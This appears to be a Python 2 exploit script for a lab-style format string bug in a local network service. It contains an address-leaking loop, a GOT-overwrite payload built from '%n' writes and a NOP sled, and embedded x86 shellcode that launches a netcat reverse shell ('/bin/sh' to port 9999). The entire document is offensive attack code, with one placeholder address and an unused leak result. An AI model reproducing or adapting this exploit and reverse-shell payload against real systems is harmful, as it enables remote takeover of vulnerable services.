#!/usr/bin/python
from subprocess import *
import struct
import socket

# Reverse shell (port 9999)
SHELLCODE="\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x39\x39\x39\x39\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46"
IP="127.0.0.1"
PORT=1234
BASE_ADDR=0xbffffff0
GOT_ADDR=0x00000000

def connect(cmd):
	msg = ""
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((IP, PORT))
	sock.sendall(cmd)
	msg = sock.recv(1024)
	sock.close()
	return msg

def socket_leak(base_addr):
	addr = base_addr
	print "[*] Trying to leak address shellcode addr"
	print "[*] Starting @ %s" % (hex(addr))
	while addr > 0xbffff000:
		addr -= 1
		result = connect(struct.pack("<I", addr) + "%5$sABCD")
		if result.count("ABCD") >= 2:
			print "[+] Found value @%s" % (hex(addr))

def socket_exploit(sh_addr):
	payload = struct.pack("<I", GOT_ADDR)
	payload += struct.pack("<I", GOT_ADDR+2)
	h, l = calc_offset(sh_addr)
	payload += "%" + str(l) + "x%5$n"
	payload += "%" + str(h) + "x%6$n"
	payload += "\x90" * 100
	payload += SHELLCODE
	#print payload
	connect(payload)

def calc_offset(shellcode_addr):
	low = (shellcode_addr & 0x0000ffff)
	high = (shellcode_addr & 0xffff0000) >> 16
	low -= 8

	# quick (and ugly) fix
	if low > high:
		high += 0xffff + 1

	diff = high - low
	diff -= 8
	return diff, low

# Leak shellcode address
#sh_addr = socket_leak(BASE_ADDR)

# exploit fsb
sh_addr = 0xbffff430
socket_exploit(sh_addr)
